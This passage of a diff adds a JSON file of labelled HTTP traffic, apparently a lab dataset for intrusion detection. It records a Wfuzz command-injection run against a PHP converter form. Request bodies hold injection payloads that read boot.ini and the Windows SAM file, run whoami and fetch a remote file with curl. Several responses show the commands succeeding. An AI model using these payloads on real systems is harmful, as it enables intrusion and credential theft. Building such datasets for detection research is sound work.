@@ -1,0 +1,1982 @@
+[
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61346",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.user_agent": "curl/7.82.0",
+      "http.accept": "*/*"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:02 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61348",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "36"
+    },
+    "req_body": "ytlink=&&type C:\\\\boot.ini&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:31 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61349",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "46"
+    },
+    "req_body": "ytlink=&& type C:\\Windows\\repair\\SAM&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:13 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61350",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "45"
+    },
+    "req_body": "ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:06 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "333",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61351",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "73"
+    },
+    "req_body": "ytlink=%22%7C%7Cecho%20HUGKZQ$((0%2B67))$(echo%20HUGKZQ)HUGKZQ\\&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:39 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61352",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "33"
+    },
+    "req_body": "ytlink=`ping 127.0.0.1`&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:24 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61353",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "98"
+    },
+    "req_body": "ytlink=\\necho INJECTX\\nexit\\n\\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\\n&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:18 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61354",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "33"
+    },
+    "req_body": "ytlink=`ping 127.0.0.1`&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:34 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "333",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61355",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "33"
+    },
+    "req_body": "ytlink=`ping 127.0.0.1`&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:07 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "298",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "/var/www/html/app1   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61356",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "45"
+    },
+    "req_body": "ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:15 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "333",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61357",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "45"
+    },
+    "req_body": "ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:34 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.34",
+    "dst_ip": "52.85.49.22",
+    "src_port": "42698",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://crowdshield.com/.testing/rce.txt",
+    "req_headers": {
+      "http.host": "crowdshield.com",
+      "http.user_agent": "curl/7.81.0",
+      "http.accept": "*/*"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "301",
+      "http.server": "CloudFront",
+      "http.date": "Sat, 04 Feb 2023 15:56:12 GMT",
+      "http.content_type": "text/html",
+      "http.content_length": "167",
+      "http.connection": "keep-alive"
+    },
+    "res_body": "<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61359",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=%20echo%20FPVLKT$((63%2B87))$(echo%20FPVLKT)FPVLKT%22&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:35 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.34",
+    "dst_ip": "52.85.49.124",
+    "src_port": "55486",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://crowdshield.com/.testing/rce.txt",
+    "req_headers": {
+      "http.host": "crowdshield.com",
+      "http.user_agent": "Wget/1.21.2",
+      "http.accept": "*/*",
+      "http.connection": "Keep-Alive"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "301",
+      "http.server": "CloudFront",
+      "http.date": "Sat, 04 Feb 2023 15:56:14 GMT",
+      "http.content_type": "text/html",
+      "http.content_length": "167",
+      "http.connection": "keep-alive"
+    },
+    "res_body": "<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61361",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "73"
+    },
+    "req_body": "ytlink=%26%26echo%20FFQWQY$((35%2B58))$(echo%20FFQWQY)FFQWQY%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:35 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.34",
+    "dst_ip": "13.224.103.71",
+    "src_port": "37814",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://crowdshield.com/.testing/rce.txt",
+    "req_headers": {
+      "http.host": "crowdshield.com",
+      "http.user_agent": "curl/7.81.0",
+      "http.accept": "*/*"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "301",
+      "http.server": "CloudFront",
+      "http.date": "Sat, 04 Feb 2023 15:56:31 GMT",
+      "http.content_type": "text/html",
+      "http.content_length": "167",
+      "http.connection": "keep-alive"
+    },
+    "res_body": "<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61366",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "28"
+    },
+    "req_body": "ytlink=\" && whoami&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:32 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61367",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "67"
+    },
+    "req_body": "ytlink='&&echo%20TWKYHE$((0%2B57))$(echo%20TWKYHE)TWKYHE|&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:36 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.34",
+    "dst_ip": "13.224.103.56",
+    "src_port": "55160",
+    "dst_port": "80",
+    "req_method": "GET",
+    "req_url": "http://crowdshield.com/.testing/rce.txt",
+    "req_headers": {
+      "http.host": "crowdshield.com",
+      "http.user_agent": "Wget/1.21.2",
+      "http.accept": "*/*",
+      "http.connection": "Keep-Alive"
+    },
+    "req_body": null,
+    "res_headers": {
+      "http.response.code": "301",
+      "http.server": "CloudFront",
+      "http.date": "Sat, 04 Feb 2023 15:56:34 GMT",
+      "http.content_type": "text/html",
+      "http.content_length": "167",
+      "http.connection": "keep-alive"
+    },
+    "res_body": "<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61369",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=\"%26%26echo%20IJQIDW$((5%2B53))$(echo%20IJQIDW)IJQIDW&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:36 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61370",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "71"
+    },
+    "req_body": "ytlink=\"%20echo%20TZKEKG$((48%2B96))$(echo%20TZKEKG)TZKEKG%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:37 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61371",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "65"
+    },
+    "req_body": "ytlink=|echo%20CAUDBF$((21%2B9))$(echo%20CAUDBF)CAUDBF\\&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:37 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "301",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "CAUDBF30CAUDBFCAUDBF\\   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61372",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "69"
+    },
+    "req_body": "ytlink=||echo%20UWJWIH$((97%2B96))$(echo%20UWJWIH)UWJWIH%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:38 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61373",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "71"
+    },
+    "req_body": "ytlink=%7C%7Cecho%20QBEEHF$((22%2B49))$(echo%20QBEEHF)QBEEHF|&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:38 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61374",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=%26echo%20LPHFGP$((58%2B11))$(echo%20LPHFGP)LPHFGP%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:38 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61375",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "70"
+    },
+    "req_body": "ytlink=%27echo%20RGSQNO$((48%2B30))$(echo%20RGSQNO)RGSQNO%27&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:39 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61376",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "73"
+    },
+    "req_body": "ytlink=%27%0aecho%20UDKFRM$((88%2B90))$(echo%20UDKFRM)UDKFRM%7C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:39 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
+    },
+    "res_body": "  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=\"POST\">    <input type=\"text\" name=\"ytlink\" placeholder=\"Send your link here\" required>    <input type=\"submit\" name=\"send\" value=\"send\">   </form>  </body> </html> "
+  },
+  {
+    "attack_tag": "cmdinj",
+    "src_ip": "192.168.1.35",
+    "dst_ip": "192.168.1.34",
+    "src_port": "61377",
+    "dst_port": "80",
+    "req_method": "POST",
+    "req_url": "http://192.168.1.34/app1/yt2mp3.php",
+    "req_headers": {
+      "http.host": "192.168.1.34",
+      "http.accept": "*/*",
+      "http.content_type": "application/x-www-form-urlencoded",
+      "http.user_agent": "Wfuzz/3.1.0",
+      "http.content_length": "75"
+    },
+    "req_body": "ytlink=%22||echo%20WMJGBT$((73%2B39))$(echo%20WMJGBT)WMJGBT%5C%5C&send=send",
+    "res_headers": {
+      "http.response.code": "200",
+      "http.date": "Sat, 04 Feb 2023 15:56:39 GMT",
+      "http.server": "Apache/2.4.52 (Ubuntu)",
+      "http.content_length": "279",
+      "http.connection": "close",
+      "http.content_type": "text/html; charset=UTF-8"
